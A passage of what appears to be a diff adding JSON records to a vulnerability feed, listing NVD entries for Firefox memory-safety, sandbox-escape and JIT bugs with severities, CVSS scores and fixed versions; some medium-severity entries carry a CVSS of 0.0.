+    },
+    {
+      "id": "CVE-2026-100765",
+      "desc": "Use-after-free in the JavaScript: WebAssembly component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100765",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100766",
+      "desc": "Information disclosure in the Networking: JAR component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100766",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100767",
+      "desc": "Use-after-free in the Networking: Cache component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100767",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100768",
+      "desc": "Use-after-free in the Graphics: WebGPU component. This vulnerability was fixed in Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100768",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100769",
+      "desc": "Use-after-free in the JavaScript: WebAssembly component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100769",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100770",
+      "desc": "Sandbox escape due to use-after-free in the DOM: Content Processes component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100770",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100771",
+      "desc": "Undefined behavior in the DOM: Streams component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100771",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100772",
+      "desc": "Use-after-free in the DOM: Core & HTML component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100772",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100773",
+      "desc": "Use-after-free in the Storage: IndexedDB component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100773",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100774",
+      "desc": "Use-after-free in the DOM: Core & HTML component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100774",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100775",
+      "desc": "Sandbox escape in the Graphics component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100775",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100776",
+      "desc": "Use-after-free in the JavaScript: WebAssembly component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100776",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100777",
+      "desc": "Use-after-free in the Graphics: Canvas2D component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100777",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100778",
+      "desc": "Sandbox escape due to use-after-free in the DOM: Core & HTML component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100778",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100779",
+      "desc": "Use-after-free in the XSLT component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100779",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100780",
+      "desc": "Use-after-free in the DOM: Core & HTML component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100780",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100781",
+      "desc": "Sandbox escape due to incorrect boundary conditions in the Graphics: WebRender component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100781",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100782",
+      "desc": "Privilege escalation due to incorrect boundary conditions in the Graphics component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100782",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100783",
+      "desc": "Uninitialized memory in the Audio/Video component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100783",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100784",
+      "desc": "Use-after-free in the Layout: Text and Fonts component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100784",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100785",
+      "desc": "Use-after-free in the DOM: Core & HTML component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100785",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100786",
+      "desc": "Sandbox escape due to use-after-free in the Graphics component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100786",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100787",
+      "desc": "Sandbox escape in the XUL component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100787",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100788",
+      "desc": "Invalid pointer in the JavaScript: WebAssembly component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100788",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100789",
+      "desc": "Use-after-free in the Graphics: Canvas2D component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100789",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100790",
+      "desc": "Use-after-free in the XSLT component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100790",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100791",
+      "desc": "Use-after-free in the DOM: Core & HTML component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100791",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100792",
+      "desc": "JIT miscompilation in the JavaScript: WebAssembly component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100792",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100793",
+      "desc": "JIT miscompilation in the JavaScript Engine component. This vulnerability was fixed in Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100793",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100794",
+      "desc": "Sandbox escape due to incorrect boundary conditions in the Internationalization component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100794",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100795",
+      "desc": "Denial-of-service in the Networking component. This vulnerability was fixed in Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100795",
+      "cvss": "6.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100796",
+      "desc": "Use-after-free in the JavaScript: WebAssembly component. This vulnerability was fixed in Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100796",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100797",
+      "desc": "Privilege escalation due to use-after-free in the Graphics: WebRender component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100797",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100798",
+      "desc": "Cryptography misuse in Storage: Quota Manager component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100798",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100799",
+      "desc": "Uninitialized memory in the Graphics: WebGPU component. This vulnerability was fixed in Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100799",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100800",
+      "desc": "Sandbox escape due to use-after-free in the Disability Access APIs component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "CRITICAL",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100800",
+      "cvss": "9.6",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100801",
+      "desc": "Privilege escalation in the DLL Services component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100801",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100802",
+      "desc": "Uninitialized memory in the Graphics: WebGPU component. This vulnerability was fixed in Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100802",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100803",
+      "desc": "Same-origin policy bypass in the WebExtensions component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100803",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100804",
+      "desc": "Sandbox escape due to use-after-free in the Preferences: Backend component. This vulnerability was fixed in Firefox 157.",
+      "severity": "CRITICAL",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100804",
+      "cvss": "9.6",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100805",
+      "desc": "Race condition, use-after-free in the Audio/Video component. This vulnerability was fixed in Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100805",
+      "cvss": "7.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100806",
+      "desc": "Uninitialized memory in the Graphics: WebGPU component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100806",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100807",
+      "desc": "Privilege escalation in the DOM: Service Workers component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100807",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100808",
+      "desc": "Mitigation bypass in the DOM: Service Workers component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100808",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100809",
+      "desc": "Same-origin policy bypass in the DevTools component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100809",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100810",
+      "desc": "Other issue in the DevTools component. This vulnerability was fixed in Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100810",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100811",
+      "desc": "Sandbox escape due to use-after-free in the DOM: Core & HTML component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, and Firefox ESR 140.17.",
+      "severity": "CRITICAL",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100811",
+      "cvss": "9.6",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100812",
+      "desc": "Denial-of-service in the Graphics component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100812",
+      "cvss": "6.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100813",
+      "desc": "Invalid pointer in the JavaScript Engine: JIT component. This vulnerability was fixed in Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100813",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100814",
+      "desc": "Incorrect boundary conditions in the JavaScript Engine: JIT component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100814",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100815",
+      "desc": "Use-after-free in the CSS Parsing and Computation component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100815",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100816",
+      "desc": "Site isolation issue in the DOM: Networking component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100816",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100817",
+      "desc": "Other issue in the JavaScript: WebAssembly component. This vulnerability was fixed in Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100817",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100818",
+      "desc": "Sandbox escape due to use-after-free in the Widget: Gtk component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, and Firefox ESR 140.17.",
+      "severity": "CRITICAL",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100818",
+      "cvss": "9.6",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100819",
+      "desc": "Sandbox escape due to incorrect boundary conditions in the XPCOM component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "CRITICAL",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100819",
+      "cvss": "9.6",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100820",
